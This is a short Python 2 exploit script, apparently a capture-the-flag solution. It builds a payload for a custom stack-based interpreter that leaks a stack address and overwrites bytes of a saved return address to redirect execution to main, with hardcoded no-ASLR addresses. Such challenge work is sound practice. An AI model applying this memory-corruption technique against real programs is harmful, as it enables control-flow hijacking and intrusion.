def pushnum(n):
    n = int(n)
    s = ''
    t = 0
    if n < 0:
        t = 1
        n = -n
    if(n <= 9):
        return str(n) + 'u0s' if t==1 else str(n)
    narr = []
    while n > 0:
        narr = [n%2] + narr
        n /= 2
    if t == 0:
        s = '2u1'
    else:
        s = '2u0d'
    for i in narr[1:]:
        if i==0:
            s += 'm'
        elif t==0:
            s += 'mi'
        else:
            s += 'md'
    return s

payload = ''

# leak main

key = 0x00007fffffffddc0
main1475 = 0x00007fffffffdd58
main = 0x555555555371

payload += pushnum(main1475 - key) + 'rp' + 'irp' * 7 # prints out address of main1475

# overwrite from 0x555555555934 to 0x000055555555537c(main+11) cuz dw screw up stack (if no aslr)

# overwriting first byte
payload += 'd' * 7 + 'r' # point
payload += '0a' # get val
payload += 'i' * (0x7c-0x34) # increment
payload += 'u' # overwrite

# overwriting second byte
payload += '0r' + pushnum(main1475-key+1) + 'r' # point
payload += '0a' # get val
payload += 'd' * (0x59-0x53) # decrement
payload += 'u' # overwrite

print payload

